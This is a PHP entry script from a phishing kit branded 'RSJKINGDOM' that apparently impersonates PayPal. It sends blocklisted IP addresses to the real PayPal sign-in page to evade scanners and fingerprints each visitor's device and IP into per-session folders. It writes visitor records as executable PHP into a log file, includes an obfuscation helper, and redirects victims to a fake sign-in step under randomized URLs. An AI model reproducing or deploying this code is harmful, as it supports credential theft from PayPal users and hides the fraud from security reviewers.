<?php
/*

===================== RSJKINGDOM =====================
  _____             _    _      _       _     _
 |  __ \           | |  | |    (_)     | |   | |
 | |  | | __ _ _ __| | _| |     _  __ _| |__ | |_
 | |  | |/ _` | '__| |/ / |    | |/ _` | '_ \| __|
 | |__| | (_| | |  |   <| |____| | (_| | | | | |_
 |_____/ \__,_|_|  |_|\_\______|_|\__, |_| |_|\__|
                                   __/ |
                                  |___/
                 SPAM - EAT - SLEEP
                        AND
                    REPEAT AGAIN!
======================== + ==========================

*/


	if(substr_count($lookFl, $_SERVER['REMOTE_ADDR'])){
		header('location: https://paypal.com/signin');
		exit();
	}

	date_default_timezone_get('Asia/Bangkok');

	//$_SERVER['REMOTE_ADDR'] = "123.125.80.125";

	ob_start();

	$vData = 'vData';

	if(!file_exists($vData))
		mkdir($vData);

	session_start();
	include_once 'functions/detect.php';
  include_once 'functions/detect_os.php';
	include('functions/vCheck.php');
	include('functions/gFunction.php');
	include('functions/cdt.php');
	include('functions/lazyCrypter.php');

	$dt = date("l, F j Y h:i:s A");
    $dt1 = strtotime(date("Y-m-d H:i:s"));

	$_SESSION['vToken'] = _saltToken($_SERVER['REMOTE_ADDR']);

	$_SESSION['vDevice'] = dCheck();

	if(!file_exists($vData.'/'.$_SESSION['vToken']))
		mkdir($vData.'/'.$_SESSION['vToken']);

	if(!file_exists($vData.'/'.$_SESSION['vToken'].'/hml.txt'))
		_handleFile($vData.'/'.$_SESSION['vToken'].'/hml.txt', '1', 'w');
	else
		_handleFile($vData.'/'.$_SESSION['vToken'].'/hml.txt', (intval(file_get_contents($vData.'/'.$_SESSION['vToken'].'/hml.txt')) + 1), 'w');

	_handleFile($vData.'/'.$_SESSION['vToken'].'/dvc.txt', $_SESSION['vDevice'], 'w');

	_handleFile($vData.'/'.$_SESSION['vToken'].'/ip.txt', $_SERVER['REMOTE_ADDR'], 'w');

	_handleFile($vData.'/'.$_SESSION['vToken'].'/cntr.txt', $_SESSION['cntr'], 'w');

	$var_AF = 'vtr';

	if(!file_exists($var_AF))
		mkdir($var_AF);

	if(!file_exists($var_AF.'/catch.txt'))
		_handleFile($var_AF.'/catch.txt', "", 'a');

	if(!strpos(file_get_contents($var_AF.'/catch.txt'), $_SESSION['vToken'])){
		_handleFile($var_AF.'/catch.txt', $_SESSION['vToken']."\r\n", 'a');

		_handleFile($vData.'/'.$_SESSION['vToken'].'/dt.txt', date("M/d/Y H:i:s"), 'w');
	}
	else {
		$GF = file_get_contents($var_AF.'/catch.txt');
		$GL = explode("\r\n", $GF);
		$cV = true;
		for($i = 0; $i < count($GL); $i++)
			if($_SESSION['token'] == $GL[$i]){
				$cV = false;
				break;
			}
		if($cV){
			_handleFile($var_AF.'/catch.txt', $_SESSION['vToken']."\r\n", 'a');

			_handleFile($vData.'/'.$_SESSION['vToken'].'/dt.txt', date("M/d/Y H:i:s"), 'w');
		}
	}

	$msg = "<?php ".'$start = '.'"'.$dt1.'"; '." ".'$end = '.'strtotime(date("Y-m-d H:i:s"))'."; ".' '." echo '<font color=blue>SC</font> > ".$ip.", ".$user_browser.", ".$user_os.", ".$nama_negara.", ".$kota.", ".date('Y-m-d').", <font color=red>'; ".' echo round(abs($end - $start) / 60,0). " minute ago </font><br/>"; ?>'."
    ";

    $file=fopen("visitor_log.php","a");
    fwrite($file, $msg);
    fclose($file);

		$lc = 'myaccount/signin/step1.php';

	//echo $lc;

	HEADER("Location: <>.php?rsjkingdomdisini=session=".$_SESSION['_LOOKUP_CNTRCODE_']."&".md5(microtime())."&dispatch=".sha1(microtime())."".sha1(microtime())."".sha1(microtime())."");

?>
